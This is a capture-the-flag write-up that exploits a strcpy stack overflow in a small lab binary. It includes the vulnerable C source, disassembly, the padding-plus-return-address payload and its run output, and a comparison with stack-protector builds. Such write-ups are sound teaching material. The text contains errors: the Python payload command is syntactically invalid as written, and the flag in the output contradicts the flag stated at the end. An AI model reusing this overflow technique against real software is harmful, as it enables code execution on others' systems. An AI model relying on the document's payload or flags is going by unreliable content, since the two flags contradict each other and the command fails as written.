# Rop to the Top - 130 points

<i>Rop, rop, rop
Rop to the top!
Slip and slide and ride that rhythm...</i> 

Here's some [binary](./rop_to_the_top32) and [source](./rop_to_the_top.c). Navigate to /problems/roptothetop/ on the shell server to try your exploit out!

Hint:
Look up "Return Oriented Programming" (ROP) vulnerabilities and figure out how you might be able to change the return address.

### Solution
###### Writeup by asinggih with a lot of help from Dhaval Kapil's [article](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)

Basically what we have to do in this particular challenge is to execute a function that isn't actually called by the program. All the program does is copy whatever we put inside ```argv[1]```, into it's a ```char``` array called ```destination``` with a size of ```32``` (Look at the given source code below).

```c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void the_top(){

	system("/bin/cat flag");

}

void fun_copy(char *input){

	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}

int main (int argc, char **argv){
	gid_t gid = getegid();
	setresgid(gid,gid,gid);

	if (argc == 2){
		puts("Now copying input...");
		fun_copy(argv[1]);
	} else {
		puts("Usage: ./rop_to_the_top32 <inputString>");
	}

	return 0;
}

```

As the hint suggested, we need to change the return address of the function, so that we can call the ```the_top``` function. I did a bit of research in return oriented programming vulnerabilities, and came across a pretty good [resource](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/). The article basically mentioned that the vulnerability is only possible when the program is not compiled using stack protector. Stack protector prevents overflow attacks by setting up a 'canary'(a random integer) into the memory stack. The canary is then checked, before the function returns. If the value is different, then the program is terminated. Since stack smashing attacks generally requires writing beyond the limit of the buffer, it also changes the value of the canary.

With that being said, the article proceeds with steps to get into doing the buffer overflow attack. First step that should be done is to see the objdump of the particular binary. Below is the dump of the interesting parts of ```rop_to_the_Top32```:


```sh
080484db <the_top>:
 80484db:	55                   	push   %ebp
 80484dc:	89 e5                	mov    %esp,%ebp
 80484de:	83 ec 08             	sub    $0x8,%esp
 80484e1:	83 ec 0c             	sub    $0xc,%esp
 80484e4:	68 20 86 04 08       	push   $0x8048620
 80484e9:	e8 b2 fe ff ff       	call   80483a0 <system@plt>
 80484ee:	83 c4 10             	add    $0x10,%esp
 80484f1:	90                   	nop
 80484f2:	c9                   	leave  
 80484f3:	c3                   	ret    

080484f4 <fun_copy>:
 80484f4:	55                   	push   %ebp
 80484f5:	89 e5                	mov    %esp,%ebp
 80484f7:	83 ec 28             	sub    $0x28,%esp
 80484fa:	83 ec 08             	sub    $0x8,%esp
 80484fd:	ff 75 08             	pushl  0x8(%ebp)
 8048500:	8d 45 d8             	lea    -0x28(%ebp),%eax
 8048503:	50                   	push   %eax
 8048504:	e8 77 fe ff ff       	call   8048380 <strcpy@plt>
 8048509:	83 c4 10             	add    $0x10,%esp
 804850c:	83 ec 0c             	sub    $0xc,%esp
 804850f:	68 2e 86 04 08       	push   $0x804862e
 8048514:	e8 77 fe ff ff       	call   8048390 <puts@plt>
 8048519:	83 c4 10             	add    $0x10,%esp
 804851c:	90                   	nop
 804851d:	c9                   	leave  
 804851e:	c3                   	ret    

```
As it can be seen in the source code, the function that we want to force execute is ```<the_top>```, and our input is being handled by the function ```<fun_copy>```. By looking at the objdump, it can be derived that:

* the address of function ```<the_top>``` is ```080484db``` in hex

	```sh
	080484db <the_top>
	```

* ```0x28 and 0x8, which is 48 in decimal``` is reserved for local variables of ```<fun_copy>```

	```
	80484f7:	83 ec 28             	sub    $0x28,%esp
 	80484fa:	83 ec 08             	sub    $0x8,%esp
	```

* The address of ```destination``` starts at ```0x28 or 40 in decimal```. It means that the array ```destination``` has a 40 bytes reserve, even though it was set up as ```32 bytes``` in the source code

	```
	8048500:	8d 45 d8             	lea    -0x28(%ebp),%eax
	```



##### Payload Design
With these information, we can design the payload to attack the program.
40 bytes are reserved for ```destination```, which is located right next to the ```%ebp``` (extended base pointer) for the ```main()```. Hence the next 4 bytes will be used store the ```%ebp```, and the next 4 bytes will store the return address of the next function call. Therfore the payload can be constructed with ```40 bytes + 4 bytes``` of a random character + the return address of the function that we want to execute. In this case ```080484db <the_top>```.

As Dhaval Kapil has mentioned in his artice, the address of our function needs to be written differently depending on the endinaness of our machines. Since my machine is little endian, I had to wrote the address backwards. Below is my final payload

```sh
python -c "print('A'*44 + \xdb\x84\x04\x08)"
```

```\x``` is to show python that the value is in hex, and notice that i take pairs from the end of the address of our function ```080484db <the_top>```.


```sh
❯ ./rop_to_the_top32 `python -c "print('A'*44 + \xdb\x84\x04\x08)"` 
Now copying input...
Done!
actf{signed_ints_aint_safe}

[1]    44828 segmentation fault  ./rop_to_the_top32 `python -c "print('A'*44 + \xdb\x84\x04\x08)"`

```

However, when the source code is compiled using stack-protector, this is what we get

```sh
❯ ./mybin `python -c "print('A'*44 + \xdb\x84\x04\x08)"`
Now copying input...
Done!
*** stack smashing detected ***: <unknown> terminated
[1]    43632 abort      ./mybin `python -c "print('A'*44 + \xdb\x84\x04\x08)"`
```


## Flag
>actf{strut_your_stuff}



